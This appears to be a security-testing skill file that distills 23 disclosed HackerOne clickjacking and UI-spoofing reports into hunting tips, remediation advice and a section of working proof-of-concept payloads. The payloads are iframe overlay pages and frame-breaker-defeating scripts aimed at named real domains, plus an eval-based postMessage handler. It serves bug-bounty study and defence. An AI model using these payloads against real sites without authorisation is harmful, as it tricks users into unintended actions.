---
name: clickjacking-ui-spoofing
description: "Clickjacking, UI Redressing & Spoofing offensive playbook from 23 disclosed HackerOne reports (6 high, 5 medium, 12 low). Use when hunting or reviewing clickjacking, ui redressing & spoofing. Triggers: clickjacking, website, page, spoofing, allowed."
license: "For authorized security testing and education only."
---

# Clickjacking, UI Redressing & Spoofing

> Distilled from **23** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

The UI can be framed or visually spoofed so victims perform unintended actions or trust attacker-controlled content.

## Where to hunt

- Check for missing `X-Frame-Options`/`frame-ancestors`; look for content/UI that renders attacker text as trusted.

## Exploitation playbook

- Frame sensitive actions and overlay decoy UI to capture clicks; spoof content/UI to mislead users.

## Bypass techniques

- Framing where only some paths set framing protections.

## Impact & escalation

- Trick users into state changes (enable feature, confirm payment) or credential entry.

## Remediation

- Set `frame-ancestors`/`X-Frame-Options: DENY`, require explicit confirmation, and clearly delimit trusted content.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#658217](https://hackerone.com/reports/658217)  -  Clickjacking in [exchangemarketplace.com]
*low*

```
Vulnerable to Clickjacking
<script  >function t(e){window.setTimeout("stop();",10);}window.onbeforeunload=t;var frames=new Array();</script>
<div  qjid="quickjack" style="overflow: hidden; width: 1330px; height: 539px; position: relative;" id="cksl6">
<iframe   name="cksl7" src="https://exchangemarketplace.com" style="border: 0pt none ; left: -6px; top: -3px; position: absolute; width: 1366px; height: 576px;" scrolling="no" onload="window.cksl3='';window.cksl1=function(arg){if(!window.cksl2)window.cksl2=arg;if(window.cksl2<arg){if(window.cksl3){self.location.href=window.cksl3;}else {var c4=document.getElementById('cksl6').style;var c5=document.getElementsByName('cksl7')[0].style;document.body.style.overflow='hidden';document.body.style.width=document.body.style.height=c4.width=c5.width=c4.height=c5.height='100%';c4.position=c5.position='absolute';c4.overflow=c5.overflow='visible';c4.top=c5.top=c4.left=c5.left='0px';}window.cksl2=arg;}setTimeout('window.cksl1(history.length)',1000);};setTimeout('window.cksl1(history.length)',2000);"></iframe></div>
```

### 2. [#2964441](https://hackerone.com/reports/2964441)  -  Clickjacking in main domain https://topechelon.com/
*high*

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking PoC</title>
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.6; /* Makes the iframe invisible */
        z-index: 99;
    }

    button {
        z-index: 100;
        top:400px;
        position: relative;
    }
    h1 {
        top: 300px;
        position: relative;

    }
</style>
</head>
<body>
<h1>Click the button for a surprise!</h1>
<button onclick="alert('Surprise!')">Click Me!</button>

<!-- Invisible iframe targeting the account deletion URL -->
<iframe id="target-frame" src="https://topechelon.com/" frameborder="0"></iframe>

<script>
    
    document.getElementById('target-frame').onload = function() {
        
# … truncated …
```

### 3. [#2964441](https://hackerone.com/reports/2964441)  -  Clickjacking in main domain https://topechelon.com/
*high*

```html
<script>
    
    document.getElementById('target-frame').onload = function() {
        
        console.log('Iframe has loaded, ready for clickjacking.');
    };
</script>
```

### 4. [#1574017](https://hackerone.com/reports/1574017)  -  Clickjacking at  app.lemlist.com
*high*

```http
Put every above url one by one in the code of iframe, which is given below
```

### 5. [#997198](https://hackerone.com/reports/997198)  -  Content Spoofing/Text Injection in https://support.cs.money and JS …
*low*

```
case 'method':
            try {
                postMessage({
                    cbid: data.cbid,
                    result: eval(`(${data.method})`)()
                });
            } catch (err) {
                console.warn(err);
            }
            break;
```

### 6. [#658217](https://hackerone.com/reports/658217)  -  Clickjacking in [exchangemarketplace.com]
*low*

```html
<script  >function t(e){window.setTimeout("stop();",10);}window.onbeforeunload=t;var frames=new Array();</script>
```

More payloads: see [payloads.md](payloads.md) (10 curated).

## Recurring patterns in this dataset

Most frequent terms across the 23 reports (term (count)): `clickjacking` (25), `website` (10), `page` (6), `spoofing` (6), `allowed` (5), `vulnerable` (4), `potentially` (4), `header` (4), `domain` (4), `service` (4), `email` (4), `leading` (3), `unauthorized` (3), `iframe` (3), `lead` (3), `trick` (3), `clicking` (3), `x-frame-options` (3)

## Worked example  -  [report #662287](https://hackerone.com/reports/662287)

*Cross-site Scripting (XSS) - Stored in RDoc wiki pages* (high, $3,500)

> Summary When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format {<img src }[link] For example it is possible to specify a class attribute when creating an image link: will generate the following: This will place a link taking over the entire page and intercept any clicks, atwho-view select2-drop-mask pika-select are just some real classes that make the links position absolute with a high z-index. The target attribute could also be set to blank and as there is no rel="noopener" reverse tabnabbing is also possible. Another attack that is more likely to work would be to create a fo…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#662287](https://hackerone.com/reports/662287) | high | $3,500 | gitlab | Cross-site Scripting (XSS) - Stored in RDoc wiki pages |
| [#2964441](https://hackerone.com/reports/2964441) | high |  -  | top_echelon_software | Clickjacking in main domain https://topechelon.com/ |
| [#643274](https://hackerone.com/reports/643274) | high |  -  | x | Viral Direct Message Clickjacking via link truncation leading to capture of both Google… |
| [#295339](https://hackerone.com/reports/295339) | high |  -  | ibb | Mailsploit: a sender spoofing bug in over 30 email clients |
| [#1574017](https://hackerone.com/reports/1574017) | high |  -  | lemlist | Clickjacking at  app.lemlist.com |
| [#783191](https://hackerone.com/reports/783191) | high |  -  | gener8 | Clickjacking to change email address |
| [#591432](https://hackerone.com/reports/591432) | medium | $1,120 | x | Twitter Periscope Clickjacking Vulnerability |
| [#2109320](https://hackerone.com/reports/2109320) | medium | $1,000 | mozilla | Potential Spoofing Risk through Firefox Private Relay Service |

*See [reference.md](reference.md) for all 23 reports in this class.*
